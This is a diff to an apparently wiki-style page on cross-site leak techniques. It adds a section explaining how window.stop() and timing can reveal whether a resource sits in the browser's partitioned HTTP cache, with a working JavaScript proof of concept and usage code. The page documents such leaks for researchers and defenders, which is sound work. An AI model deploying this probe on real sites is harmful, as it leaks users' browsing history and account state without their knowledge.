@@ -11,6 +11,7 @@ abuse = [
     "CSP Violations",
     "Redirects",
     "window.open",
+    "window.stop",
     "iframes",
 ]
 defenses = [
@@ -155,6 +156,46 @@ fetch('https://example.org/might_redirect', {
 
 An online bank decides to redirect wealthy users to attractive stock opportunities by triggering a navigation to a reserved space on the website when these users consult their account balance. If this is only done for a specific group of users, it becomes possible for an attacker to leak the "client status" of the user.
 
+## Partitioned HTTP Cache Bypass
+
+If a site `example.com` includes a resource from `*.example.com/resource` then that resource will have the same caching key as if the resource was directly requested through top-level navigation. That is because the caching key is consisted of top-level *eTLD+1* and frame *eTLD+1*. [^cache-bypass]
+
+Because a window can prevent a navigation to a different origin with `window.stop()` and the on-device cache is faster than the network,
+it can detect if a resource is cached by checking if the origin changed before the `stop()` could be run. 
+
+```javascript
+async function ifCached_window(url) {
+  return new Promise(resolve => {
+    checker.location = url;
+
+    // Cache only
+    setTimeout(() => {
+      checker.stop();
+    }, 20);
+
+    // Get result
+    setTimeout(() => {
+      try {
+        let origin = checker.origin;
+        // Origin has not changed before timeout.
+        resolve(false);
+      } catch {
+        // Origin has changed.
+        resolve(true);
+        checker.location = "about:blank";
+      }
+    }, 50);
+  });
+}
+```
+Create window (makes it possible to go back after a successful check)
+```javascript
+let checker = window.open("about:blank");
+```
+Usage
+```javascript
+await ifCached_window("https://example.org");
+```
 
 ## Defense
 
@@ -184,3 +225,4 @@ A vulnerability reported to Twitter used this technique to leak the contents of 
 [^1]: Protected tweets exposure through the url, [link](https://hackerone.com/reports/491473)
 [^2]: Disclose domain of redirect destination taking advantage of CSP, [link](https://bugs.chromium.org/p/chromium/issues/detail?id=313737)
 [^3]: Using Content-Security-Policy for Evil, [link](http://homakov.blogspot.com/2014/01/using-content-security-policy-for-evil.html)
+[^cache-bypass]: [github.com/xsleaks/wiki/pull/106](https://github.com/xsleaks/wiki/pull/106)
